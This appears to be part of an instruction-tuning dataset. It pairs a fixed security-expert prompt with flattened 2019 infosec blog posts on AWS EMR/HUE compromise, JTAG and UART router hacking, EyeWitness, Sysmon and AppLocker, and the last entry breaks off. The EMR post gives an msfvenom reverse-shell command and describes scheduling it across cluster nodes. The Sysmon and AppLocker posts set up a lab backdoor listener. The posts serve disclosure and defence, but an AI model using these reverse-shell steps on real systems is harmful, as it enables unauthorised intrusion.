        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Securing the Cloud: A Story of Research, Discovery, and Disclosure</title>\n<taxonomies>Author, How-To, Informational, Jordan Drysdale, AWS EC2, AWS EMR, Coordinated disclosure, Jordan Drysdale, Nessus, Nmap, pentest, securing the Internet</taxonomies>\n<creation_date>Wed, 21 Aug 2019 19:51:38 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale tl dr BHIS made some interesting discoveries while working with a customer to audit their Amazon Web Services AWS infrastructure At the time of the discovery we found two paths to ingress the customer's virtual private cloud VPC through the elastic map reduce EMR application stacks One of the vulns that gained us internal access was the Hadoop Unauthenticated RCE which was patched by Apache a while back now Another and a bit more interesting entry point was the HUE interface which by default allows the creation of a new admin user for the web interface Once in the web interface HUE is similar to Jupyter in that it helps visualize code flow and operations Here you can create schedules that will send egress shells from the cluster worker nodes Which consequently provides a window to a virtual private cloud network Lots of the links best practices security operations on AWS stuff and a lot of the words below come from an amazing guy named Zack Thank you Zack for helping the digital world get better every day ...and on to the story Big data processing engines form the backbone of today's large tech companies As a result the Internet has become a collection of data centers seemingly hell-bent on gathering as much information about us as possible This data is aggregated compiled and then stuffed in demographic containers Access to those demographic containers is then sold to bidders who want to deliver advertising political propaganda and all sorts of other nonsense Welcome to the Big Data era where aggregated data points are bought and sold for pennies on the Internet every minute of every hour What does this actually have anything to do with infosec pentesting security in the cloud or of the cloud whatever One of these big data solutions on AWS is called EMR Elastic Map Reduce I think it's HDInsight on Azure and Cloud Dataproc on Google Cloud GCP With a couple of clicks you too like Black Hills InfoSec can deploy your own data processing engine of whatever size you choose on whatever platform makes sense for whatever purpose As part of deploying solutions in the cloud it is the responsibility of sysadmins to configure manage and secure those services It is the responsibility of leadership ownership and Boards of Directors everywhere to implement and enforce policies and procedures that pentesters and auditors can double-check via exploit testing and policy checkbox validations The responsibility of physical security deploying proper virtualization maintaining hardware and then selling us those services belongs to the cloud provider In the case of EMR with a few clicks several EC2 instances are deployed in a master worker model Instructions and operations are sent using the master's console which are subsequently processed by the worker nodes So all that to get to the point securing our services BHIS uses Tenable's products for the most part as our standard vulnerability scanner Is it perfect No Does it accomplish our goals Yes As part of a pretty standard pentest a typical BHIS customer might ask for an external network review and an internal pentest BHIS practices the things we preach most of the time and so we periodically scan and pentest our own external and internal services Hold up here a bit more clarification is necessary The EMR cluster is just a few clicks to deploy and was designed to be an easy to implement solution with minimal effort required to maximize data processing capabilities We are testing against a deployment sitting at defaults with a single modification to the security group that allowed our scanner full network access Some statistics from the scan can be reviewed in the next few bullet points Three node cluster 55 individual and unique open ports at default 10 total mixed vulnerabilities Low Medium High Critical Unsupported PHP version 5.6.40 on master node Let's stop here and review some things again The EMR cluster is a collection of third-party applications running on an Amazon pre-baked AMI running these file system services Hadoop Distributed File System Elastic Map Reduce File System super cool can talk file system to S3 A list of the software that comes pre-installed on this cluster looks something like this Hue Versions vary Yet Another Resource Navigator YARN Hadoop MapReduce Flink Apache Spark Ganglia Hive Jupyter Oozie Pig Et cetera ad infinitum Ref ocs.aws.amazon.com emr latest ReleaseGuide images emr-releases-5x.png Mind you and if you aren't already aware this is a pretty extensive ecosystem of services to secure One of the most amazing things about this ecosystem is how efficient the single click deployment services are Honestly running this solution along with scaling technologies and some code automation can result in an incredibly efficient data processing solution So what are the security implications of all this open sourcery For the stack deployer it's easy to assume things are mostly secure when spinning up an EMR cluster includes the following layered protections Amazon EMR's default security groups do not allow ingress from the Internet Amazon EMR-Managed Security Groups allow customers to have AWS manage the network connectivity between their master and worker nodes EMR Docs on network management provide warnings to customers about exposing their EMR infrastructure to the Internet If you can forgo SSH access to your non-interactive cluster it can simplify hardening the EMR cluster Amazon EMR release versions 5.10.0 and later support Kerberos to control access to nodes in the cluster Full documentation is posted online There is much more The next list covers best practices documented by AWS for customers to further secure their infrastructure If a cluster is used for batch processing and an interactive user or another application does not need to access it launch the cluster in a private subnet with an S3 endpoint and any other required endpoints See Configure Networking for more information Customers can launch clusters in a VPC private subnet a subnet without any ingress egress points defined If the cluster does require access ssh to an AWS service that does not have a VPC endpoint or requires access to the internet Customers can create a NAT instance to provide a layer of control between the VPC subnet and the Internet Scenario 2 in the documentation VPC with Public and Private Subnets NAT has more information If a customer is using a private subnet and creating an S3 endpoint they can use an S3 policy to restrict access for the endpoint The minimum policy requirement is documented at Amazon EMR 2.x and 3.x AMI Versions If customer's launch in a VPC private subnet but still require interactive access to the cluster A customer can create a bastion host also known as an edge node that sits in a public subnet and connect to your EMR cluster from it This setup allows you to enforce security policies on the edge node but not on the EMR cluster A guide is provided to Securely Access Web Interfaces on Amazon EMR Launched in a Private Subnet on the AWS Big Data Blog Taking the steps to manage and secure this infrastructure is still the responsibility of business owners technical implementers IT auditors basically every stakeholder up and down the chain of command The nature of open source requires extra attention Security does not fall lightly on systems administrators tasked with data management and security There are layers of considerations processes procedures and controls to consider throughout the systems life cycle And as part of our lack of initial documentation review and diligence we confirmed you can add your new admin user and execute malicious code through HUE during our vulnerability scan and test The Hue service comes up waiting for a new administrative user This is bad right Auto-scaling can spin up EMR depending on your usage at the rate of several clusters per day It becomes exceptionally difficult to control the service seen below Hue Management Interface at Defaults We added a user as most reasonable ethical hackers would do The Hue interface allows you to design tasks in various languages and schedule them to run in the cluster Since we are tasking the master node with scheduling work we can hopefully have it run C2 code The following screenshot demonstrates the next step in accessing the worker node shells Query dropdown box Scheduler Workflow Once inside the workflow drag and drop the shell option Run A Shell Script We are then prompted to upload a file or run a command and we head over to our msfconsole In testing binary files don't seem to run as expected but the following command worked to gen up a reverse_bash shell that consistently called back msfvenom -p cmd unix reverse_bash LHOST 1.1.1.1 LPORT 443 -f raw shell-revBash.sh Uploading the shell-revBash file as seen here clicking on it and saving the workbook is next Reverse Shell Posted to Local HDFS Storage Then run it via the workflow's play button Top Right Play That is pretty much it and we get a shell The thing is and this is important is that you can schedule this workflow If you schedule it like a normal code operation running say every five minutes you will end up compromising all of the workers in the cluster If your C2 channel connects over DNS you might end up with a semi-resilient C2 channel back to a VPC Shellz as 'yarn Let's review these couple of vulnerabilities First the Hue interface comes up waiting for someone to create an admin user That user can create workflows and execute shell scripts through the underlying Oozie editor Second those tasks can be scheduled tasks and an entire cluster can be compromised using reverse shells The shells can be used to move laterally through a VPC Layers of things had to happen for these bits and pieces to land us an actual C2 channel into a VPC However it really could be as simple as landing a session on a jump host and finding TCP port 8888 open somewhere Or you could check Shodan and see if any of these might be exposed to the Internet At the time of initial write-up somewhere around December 2018 there were about 900 Hue interfaces exposed As of August 20 2019 there were 663 instances that may be vulnerable to this compromise Shodan Results on Hue Related Interfaces You can figure out the Shodan search yourself it's not that hard That said this has been disclosed to Amazon and researched on GCP Amazon is aware of the concerns this might present to customers with public-facing EMR installations Scaling is also a concern because new clusters will come online in a state ready for pillaging Be extra cautious about your jump hosts these are a very likely avenues for compromise Bottom line this isn't necessarily a vulnerability more like a feature of HUE but it is a significant risk Secure your services Read the manual Hire pentest firms to cover gaps Get training Develop an incident response plan Hugs and cookies BHIS Jordan Links HUE ethue.com Jupyter Code Flows UI upyter.com Kerberos Integration for Elastic Map Reduce ocs.aws.amazon.com emr latest ManagementGuide emr-kerberos.html EMR Release Info and Software ocs.aws.amazon.com emr latest ReleaseGuide images emr-releases-5x.png AWS Networking Overview ocs.aws.amazon.com emr latest ManagementGuide emr-plan-vpc-subnet.html VPCs NAT and YOU ocs.aws.amazon.com AmazonVPC latest UserGuide VPC_Scenario2.html AWS AMIs for EMR ocs.aws.amazon.com emr latest DeveloperGuide private-subnet-iampolicy.html Secure Access for EMR ws.amazon.com blogs big-data securely-access-web-interfaces-on-amazon-emr-launched-in-a-private-subnet Chris Gates Offensive AWS Tools ithub.com carnal0wnage weirdAAL NCC Group's ScoutSuite Utilities ithub.com nccgroup ScoutSuite"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>JTAG - Micro-Controller Debugging</title>\n<taxonomies>Author, Hardware Hacking, How-To, Informational, Ray Felch, debugging, hardware hacking, JTAG, JTAGulator, picocom, Raymond Felch</taxonomies>\n<creation_date>Tue, 27 Aug 2019 18:20:55 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Raymond Felch Being an embedded firmware engineer for most of my career I quickly became fascinated when I learned about reverse engineering firmware using JTAG I decided to take on this project as an opportunity to learn more about this somewhat obscure and often overlooked attack vector excerpt from n.wikipedia.org wiki JTAG JTAG named after the Joint Test Action Group which codified it is an industry-standard for verifying designs and testing printed circuit boards after manufacture JTAG implements standards for on-chip instrumentation in electronic design automation EDA as a complementary tool to digital simulation It specifies the use of a dedicated debug port implementing a serial communication interface for low-overhead access without requiring direct external access to the system address and data buses The interface connects to an on-chip Test Access Port TAP that implements a stateful protocol to access a set of test registers that present chip logic levels and device capabilities of various parts The Joint Test Action Group formed in 1985 to develop a method of verifying designs and testing printed circuit boards after manufacture In 1990 the Institute of Electrical and Electronics Engineers codified the results of the effort in IEEE Standard 1149.1-1990 entitled Standard Test Access Port and Boundary-Scan Architecture JTAG is an industry-standard Test Access Port for debugging and running diagnostics of integrated circuits after a PCB has been assembled Originally providing manufacturers with a simplified way to test a circuit board design it's even more relevant now that devices are using a Ball Grid Array BGA making it difficult to test due to the reduced size Additionally an exposed interface creates the means for engineers to assess the signals without directly interfacing using physical connections to circuits After reviewing a variety of JTAG related videos I discovered a number of positive benefits in gaining access to the target device especially the ability to read and write to these devices The possibilities seemed endless In an effort to get started I located a Linksys BEFSR41 ver2 router at a local garage sale and it was 'game on to begin experimenting with a few of the many JTAG hardware and software tools I was determined to duplicate the efforts and accomplishments of some of those videos that I had witnessed After much research I decided to purchase the JTAGulator board from Parallax and a couple of popular serial interface boards DangerousPrototypes Bus Pirate and Bus Blaster as well as the Attify Badge I started with the JTAGulator an open-source hardware tool designed by Joe Grand to not only locate but also identify the JTAG pins on the target board which in turn provides the ability to find on-chip debugging OCD interfaces Also featured on this tool is the ability to locate and identify UART pins Locate and identify the JTAG pins on the target board Before getting started I first located and printed datasheets for the target board the Linksys BEFSR41 ver2 router I quickly found the following devices on board CPU Samsung S3C4510001 ARM7TDI 50Mhz Flash memory MX 29F040QC-90 5 volt CMOS 512Kbit x 8 0.5 Mbyte SDRAM memory SI IC41C16256-35K x2 512Kbyte 256K x 16 dynamic RAM Ethernet controllers RealTek RTL8019AS ISA Full-Duplex Controller KENDIN KS8995E 5-port 10 100 Integrated Switch Based upon information that I acquired watching instructional videos for the JTAGulator board by its author Joe Grand I determined what I thought might be a JTAG TAP test access point at JP-1 Joe Grand's JTAGulator video ww.youtube.com watch?v GgMOBhmEJXA Identify the JTAG pins Often you'll find TMS TCK TDI TDO etc inscribed on your PCB so you know you're dealing with a device that supports JTAG but it gets more difficult when the pins aren't labeled and you need to rely on third-party documentation Of course it is also possible that your board has a JTAG header instead of mere pins contacts JTAG access points are often intentionally hidden by the board designers and in most cases lack headers or board markings You might also get the datasheet on the on-board micro-controller Sometimes the pins are marked with JTAG references and the PCB traces might lead out to an access point For example On my target board JP-1 is a header-less 2 x 7 row of feed-thru pin sockets Finally I needed to locate ground on the target device and jumper it to a GND pin on the JTAGulator board NOTE The JTAGulator and the target device MUST share a common ground point to ensure proper reference voltages and reliable readings before continuing with any testing Also using a desoldering tool solder sucker I cleared the solder from the JP-1 pin sockets and soldered in 2 7 pin male headers to facilitate hooking up jumper wires for my debugging Using a multimeter I determined that pins 2 4 6 8 10 12 and 14 were all tied to circuit-ground This left 8 unknown pins of which 5 could be the 4 required and 1 optional JTAG pins TDI Test data in TDO Test data out TMS Test mode select TCK Test clock TRST Test reset optional Using channels 0 through 7 on the JTAGulator board I connected jumper wires to the 8 unknown pins on the target device order of connection was not relevant Note pin-14 is the green GND jumper wire At this point I powered the target device using the manufacturer provided 9VDC adapter and then powered the JTAGulator board via the mini-USB cable to my Linux desktop In a command shell on my Linux machine I located the serial port of the JTAGulator and established a serial connection to it using picocom a minimal dumb-terminal emulation program that is great for accessing a serial port based Linux console Installing picocom On Ubuntu you can simply sudo apt-get install picocom Excerpt from the QuickStart instructions ww.parallax.com sites default files downloads 32115-JTAGulator-Product-Brief-1.1.pdf The JTAGulator is powered from the host computer's USB port and uses an industry-standard FTDI FT232RL device to provide the USB connectivity drivers available from www.ftdichip.com Drivers VCP.htm The device will appear as a Virtual COM port and will have a COM port number automatically assigned to it All communication is 115200 bps 8 data bits no parity 1 stop bit Use a terminal program for example HyperTerminal PuTTY CoolTerm picocom or screen to communicate with the JTAGulator dmesg grep tty determine serial device port sudo picocom -b 115200 -r -l dev ttyUSB0 -b baudrate and -r no reset and -l no lock Clicking ENTER gets me the JTAGulator command prompt H prints available commands Before proceeding any further I needed to determine the system voltage of the target device This was done using a multimeter set up for DC voltage measurements and checking various points around the target board including the header that I soldered in It was determined the system voltage was 3.3 volts V Set target system voltage 1.2V to 3.3V Before executing the Identify JTAG pinout BYPASS Scan I performed an Identify JTAG pinout IDCODE Scan Executing the ID code scan is considerably faster than the Bypass scan TDI is not required resulting in fewer scan permutations although the ID scan only finds 3 of the required 4 JTAG pins I Identify JTAG pinout IDCODE scan Executing the Get Device ID s command provides D Get Device ID s Executing the Identify JTAG pinout BYPASS scan command provides us with the 4 required JTAG pins and optional TRST pin assignments B Identify JTAG pinout BYPASS scan Executing the Test BYPASS TDI TDO command verifies that the 32 bits of random data sent out on TDI to the target device is correctly returned on TDO back to the JTAGulator T Test BYPASS TDI TDO Summary Using the JTAGulator when attempting to identify suspected JTAG pins is always going to be an invaluable tool and highly recommended Together with knowing the JTAG pinout connecting a JTAG compatible USB adapter and some good debug tools OpenOCD GDB binwalk etc you should be successful in communicating with your hardware target In conclusion it's safe to say that vendors may soon realize the importance of hiding these TAPs to protect their proprietary interests These TAPs have been around for a long time and I don't see them going away any time soon as they do provide importance to the manufacturing cycle Using the methods mentioned above along with acquiring the appropriate SoC System on a Chip datasheets could help you locate the more obscured TAPs Many times just looking near the chip itself can provide clues Other times the TAPs may be hidden under the SoC in question requiring chip removal Following traces difficult as it may be can also guide you to potential test points"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Hack Hardware using UART</title>\n<taxonomies>Author, Hardware Hacking, How-To, Informational, Physical, Ray Felch, Red Team Tools, Embedded systems, hardware hacking, JTAG, JTAGulator, Raymond Felch, reverse engineering, UART</taxonomies>\n<creation_date>Tue, 03 Sep 2019 17:21:05 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Raymond Felch Preface I began my exploration of reverse-engineering firmware a few weeks back see JTAG Micro-Controller Debugging and although I made considerable progress finding and identifying the JTAG Joint Test Action Group pins on my target board Samsung S3C4510 CPU Linksys BEFSR41 router there were complications I ran into a number of issues while attempting to extract the firmware using OpenOCD and a few different JTAG adapters including using a home-brew Raspberry Pi3 as a JTAG and SWD adaptor see ovr0.com 2016 09 02 use-raspberry-pi-23-as-a-jtagswd-adapter which worked well and got around the speed control limitations of the Bus Pirate In some cases I was able to dump memory from the flash device but the data was erratic and unrecognizable when using the binwalk tool This may be a timing-related issue or possibly not getting the target in the proper halt state prior to reading memory I also realize that from time to time vendors may take precautions in guarding their proprietary information either by tying reset pins high or opening critical JTAG paths by way of deliberately blowing fuses after production testing My list of unknown issues is increased even further due to the fact that this is a 'used board of questionable state Understanding and implementing the OpenOCD Open source On-chip-debugger was a huge undertaking in itself To quote from Wikipedia OpenOCD is a free software on-chip debugging in-system programming and boundary-scan testing tool for various ARM and MIPS systems The OpenOCD server accepts commands remotely through TCP IP ports and provides an interface that allows for interacting with the on-board devices This interface can be through Telnet port 4444 or using GDB GNU Debugger on port 3333 Choosing a new router and a new approach After much frustration and needing a win I chose to temporarily take a break from this project and try a different yet similar approach to gaining access to the firmware Note Before undertaking this project I decided that I wanted to start with a known good device so I purchased a new router from my local electronics retailer a Linksys E2500 v3 The tear-down for this router was pretty simple Remove the three screws from the bottom of the router and the housing shell can be separated fairly easily using a plastic shim Finding the UART TAP As I did with the JTAG approach I examined the board for groups of pins that may provide serial access TX RX GND Immediately I saw a point on the board with 5 pins marked JD6 that I felt might be a possible serial port access point To make life easier I soldered in a 5-pin header By the way and just for the record I did find the JTAG access points on this board they were clearly marked TDI TDO TCK and TMS There were a set of access points by the CPU BCN5358 MIPS and another set by the Broadcom Radio chip BCM43236 indicating to me that it was very likely that there were multiple boundary-scan devices on this board Unfortunately the land areas were so microscopic there would be no way for me to attach to them even if I wanted to thereby making my serial approach that much more appealing The JTAGulator is my friend I quickly found the GND ground pin DJ6-5 using my multi-meter by checking for continuity from each pin to a metal shield on the board this is done with no power applied to the board Knowing which pin was ground I used my favorite hardware tool the JTAGulator and connected the remaining 4 pins to channels 0 3 I also jumpered my GND pin to GND on the JTAGulator All connected and ready to go I applied power to the target board and to the JTAGulator I fired up PICOCOM and immediately got my prompt Typing H gets me the help menu and as noted there were UART commands available to me for finding the necessary pins TX and RX Before continuing we need to set the target I O voltage This is accomplished using the V command Now we are ready to issue the U command to find our TX and RX pins As noted we need to let the JTAGulator know how many channels we need number of pins to check Upon hitting the space-bar to begin the JTAGulator tries many different baud rates in order to find the best fit By evaluating the findings we can quickly determine there appears to be a lot of communication at the 115200 baud rate Also notice regardless of the baud rate the JTAGulator seems to find the same pins for TX and RX Final results channel 3 is going to the TX DJ6 pin 2 channel 2 is going to the RX DJ6 pin 3 and the baud rate is 115200 Further testing can be done entering the Passthrough mode allowing us to actually communicate with the chip This is done by issuing the P command As you can see I was able to get a list of the commands available to me for this device Issuing a reboot command rebooted the router also providing me with relevant information about the device It appears that I'm talking to the Broadcom Radio chip BCM43236 using their proprietary wl driver Playing around a bit I tried the wlhist command that dumped the stack and rebooted itself I then tried the rpcdump command and it provided Dongle information interesting but not that useful While following an interesting blog entitled 'Reverse-Engineering Broadcom Wireless Chipsets from the people at Quarkslab.com I noticed they were able to dump memory using a tiny PySerial script that would implement the 'md command for a memory dump request I attempted many times to do this and was only marginally successful During my attempts I found that I could only snag just under 2k of data before the chip recognized the intrusion and rebooted itself thereby aborting the command and inasmuch killing my script before the bin file could be written I found that if I shortened my dump to 1K 1024 of data that I could get the data and generate tiny 1k bin files again not that useful in itself Finding UART TAP number 2 Realizing that I had very few commands provided to me to work with and also recognizing how secure this chipset might be I decided to continue looking for another serial access point that might get me connected to the Broadcom CPU directly I need to mention that at one time during my many Google searches I did run across a message in a firmware download forum where it was mentioned that the E2500 router did actually have two serial port TAPs and one was useless DJ6 Radio chip 43236 for trying to unbrick their firmware This was the motivating factor in my attempts to locate this other TAP In fact my efforts did find me another set of pins very similar to the first set Again there were 5 pins clearly marked DJ2 and again I soldered in a 5-pin header Rather than continue to use the JTAGulator as a serial dongle I decided at this time to use my Attify Badge as my UART interface The reason for this is twofold the JTAGulator although not overly expensive is still 3 or 4 times the cost of the badge and I didn't want to risk damaging this invaluable tool Also the Attify badge is geared more to serial communications with its support for UART SPI and I2C serial protocols as well as JTAG The setup is straight forward D0 and D1 are TX and RX respectively and GND is D8 Immediately upon powering up the target board using the new TAP Test Access Point DJ2 and the Attify badge I was presented with a root shell from BusyBox Typing 'help got me a bunch more commands and I went for 'login right away Trying the usual admin admin and admin password attempts got me failed attempts and I went with the standby Ctrl-C a few times Anyway after seeing a lot of text fly by my terminal finally came back to me with the prompt In fairness it is possible that I could have typed the password wrong to start with but regardless I was dropped into root shell Starting with a quick ls -la I was off traversing the many directories and sub-directories looking for anything of interest configuration files log files etc and issuing various commands ps netstat etc It appears that I'm at the heart of the firmware and in a Linux shell which was my objective all along dumping the firmware in order to eventually analyze the code reverse-engineer to learn the environment and determine what the code was doing I did perform a few checks to see if I could Telnet into the router via port 23 and or SSH in via port 22 Both attempts were refused so that's a good thing from the standpoint of router security however allowing me root access without the proper credentials in my opinion is not a smart move In summary I'd say that this was an enjoyable venture and with relatively quick results as well I've learned that there are other ways to gain access to hardware in addition to JTAG Finding two UART serial ports and using new devices Attify badge JTAGulator to connect to them proved to be very productive alternative solutions"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Fixing EyeWitness Install Errors on Kali Linux</title>\n<taxonomies>How-To, Informational, Darin Roberts, EyeWitness, Kali Linux</taxonomies>\n<creation_date>Tue, 24 Sep 2019 15:04:43 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Darin Roberts I recently had to install a new gold image as my Kali Linux testing virtual machine Almost on every test I do I clone the gold image and use the fresh install to start from On this image I install as many of the scripts and tools as I can so when I clone it I don't have to do it again One of these tools is EyeWitness It was written by Chris Truncer and can be found at ithub.com FortyNorthSecurity EyeWitness EyeWitness is a great tool that visits web servers from either a list or a .nessus file output EyeWitness takes a screenshot of the connection and compiles the screenshots in an easy to view report In addition to the screenshots the report is sorted by the type of connections and groups similar connections together This last time I went to install this on my image I had some problems getting it to run and install I was finally able to get it to work but thought I would explain how I went about fixing it First clone EyeWitness from GitHub and install If you are like me then you might get some errors when you run it The first error I got was the following To get around this I ran the following command sudo apt install xvfb Unfortunately this gave me the following error Well isn't that a pain What does Package 'xvfb has no installation candidate even mean After looking into this a little more it means that the package can't be downloaded from any of the sources identified on the etc apt sources.list file Let's add the location for this package to the file Edit this file in your favorite text editor Add the following to the bottom of the file deb ttp.kali.org kali kali-rolling main non-free contrib After you save the sources run the following apt update Then the following apt install xvfb fix-missing After I did the above I reran the EyeWitness command and it worked Problem solved After further investigation I found out that while installing the OS I clicked No on the network mirror I went back and re-installed the OS this time clicking Yes on using a network mirror I went through installing and running EyeWitness and this time it worked without any problems Just to satisfy my curiosity I compared the two sources.list files This is the file that came without using the network mirror This is the file that came from using the network mirror The difference is highlighted Since that highlighted line is the line that we added to fix our problems it seems that all we really needed to do is to use a network mirror on the installation of Kali This fix probably does fix more things other than EyeWitness I just ran into it when installing it last time and I have had the same issue on a previous install EyeWitness is a great tool for me in my job and helps screenshot web pages quickly and easily It reduces a lot of time visiting pages to determine what is being hosted on the site The method explained here helped me install it on a system that was originally misconfigured"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Getting Started With Sysmon</title>\n<taxonomies>Author, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, John Strand, ADHD, john strand, Logging, Malware, Sysmon</taxonomies>\n<creation_date>Mon, 23 Sep 2019 16:17:19 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "John Strand In this blog I want to walk through how we can set up Sysmon to easily get improved logging over what we get from normal and just plain awful logging in Windows Basically trying to get information from standard Windows logs is a lot like playing tennis against curtains Sure you can go through the right motions and you can try really hard but no matter what it is going to suck For this blog we will be using ADHD which you can get here ww.activecountermeasures.com free-tools adhd I hope that by the time you do this I will have updated it to the version I used at Black Hat 2019 First let's start up the ADHD Linux system and set up our malware and C2 listener On your Linux system please run the following command ifconfig Please note the IP address of your Ethernet adapter Please note that my adaptor is called ens33 and my IP address is 192.168.123.128 Your IP Address and adapter name may be different Please note your IP address for the ADHD Linux system below Now run the following commands to start a simple backdoor and backdoor listener sudo su cd opt java-web-attack clone.sh mail.com weaponize.py index.html 192.168.123.128 Your IP will be different serve.sh Next move back to your Windows system log in as admin We will now need to open a cmd.exe terminal as Administrator Remember hit the Windows key type cmd.exe right-click on it and then select Run As Administrator Please take a few moments and download Sysmon from here ocs.microsoft.com en-us sysinternals downloads sysmon Then extract it to a C Tools directory And download Swift on Security's sysmon config to the tools directory You can find it here ithub.com SwiftOnSecurity sysmon-config I recommend downloading it as a zip and extracting it to the Tools directory Then type the following C Windows system32 cd Tools C Tools Sysmon64.exe -accepteula -i sysmonconfig-export.xml System Monitor v10.2 System activity monitor Copyright C 2014-2019 Mark Russinovich and Thomas Garnier Sysinternals www.sysinternals.com Loading configuration file with schema version 4.00 Sysmon schema version 4.21 Configuration file validated Sysmon64 installed SysmonDrv installed Starting SysmonDrv SysmonDrv started Starting Sysmon64 Sysmon64 started Now let's download and execute the malware Next surf to your Linux system download the malware and try to run it again Now we need to view the Sysmon events for this malware You will select Event Viewer Applications and Services Logs Windows Sysmon Operational Start at the top and work down through the logs You should see your malware executing As you can see above the level of detail in the logs is fantastic It gives us the process the IP addresses who ran it and the hash values Everything you always wanted all for free From Microsoft Looking to implement this via Group Policy in Active Directory Want to throw the logs to ELK Check out the following video ww.youtube.com watch?v FeCSJBKYFBQ t 6s"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Getting Started With AppLocker</title>\n<taxonomies>Author, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, John Strand, ADHD, applocker, john strand, whitelisting</taxonomies>\n<creation_date>Mon, 30 Sep 2019 17:12:10 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "John Strand I have quite a few calls with customers who do not know where to begin when it comes to application whitelisting Often the approach some organizations take is to try and implement full application whitelisting on every single application across their entire environment While this goal is fun and seems like a good idea it is not But But Why Because the overhead is insane It is almost a full-time job keeping up with all the changes and working through patches Some organizations try to buy a product that does this for them This almost never works Ever Quit reaching for the easy button Every time you do God deploys another bot on your network out of spite And he is a vengeful God Don't make him angry Rather we should ask is there a way we can get 80 of the way there Is there a way to implement some level of whitelisting that will stop 95 of drive-by attacks Yes In this blog we are going to cover how we can implement whitelisting based on directory using Windows AppLocker But first let's see what happens when we do not have AppLocker running We will set up a simple backdoor and have it connect back to the ADHD system Remember the goal is not to show how we can bypass EDR and Endpoint products It is to create a simple backdoor and have it connect back By the way for this we will be using ADHD You can find it here ww.activecountermeasures.com free-tools adhd Also we are just going to show this on a default Windows 10 system No AV The goal of this blog is to walk through AppLocker Not bypass AV Want to bypass AV Check the following webcast out ww.youtube.com watch?v gvcgHkeZ1i4 First we need some malware Thankfully we have a couple of scripts that greatly simplify this process Please make sure both your Windows and your Linux systems are running On your Linux system please run the following command ifconfig Please note the IP address of your Ethernet adapter Please note that my adapter is called ens33 and my IP address is 192.168.123.128 Your IP Address and adapter name may be different Please note your IP address for the ADHD Linux system below Now run the following commands to start a simple backdoor and backdoor listener sudo su cd opt java-web-attack clone.sh mail.com weaponize.py index.html 192.168.123.128 Your IP will be different serve.sh Now let's surf to your Linux system from your Windows system download the malware and run it Now when you go back to your ADHD Linux system you should see a Meterpreter session Now let's stop this from happening First let's configure AppLocker To do this we will need to access the Local Security Policy on your Windows system as an Administrator account Simply press the Windows key lower left hand of your keyboard looks like a Windows Logo then type Local Security It should bring up a menu like the one below Please select Local Security Policy Next we will need to configure AppLocker To do this please go to Security Settings Application Control Policies and then AppLocker In the right-hand pane you will see there are 0 Rules enforced for all policies We will add in the default rules We will choose the defaults because we are far less likely to brick a system Please select each of the above Rule groups Executable Windows Installer Script and Packaged and for each one right-click in the area that says There are no items to show in this view and then select Create Default Rules This should generate a subset of rules for each group It should look similar to how it does below Now we will need to start the Application Identity Service This is done by pressing the Windows key and typing Services This will bring up the Services App Please select that and then double-click Application Identity Once the Application Identity Properties dialog is open please press the Start button This will start the service Now we need to create a standard user account on your Windows system I called mine whitelist Next log out as Administrator and log back in as whitelist Now let's surf to your Linux system download the malware and try to run it again You should get an error The goal of this is to show just how easy it is to create default rules based on directory path Is this 100 effective Nope Not even close Will it stop a tremendous amount of drive by attacks and make most penetration testers cry Absolutely By the way are you looking for a webcast on how to implement this via Group Policy in Active Directory Cool Check this out ww.youtube.com watch?v 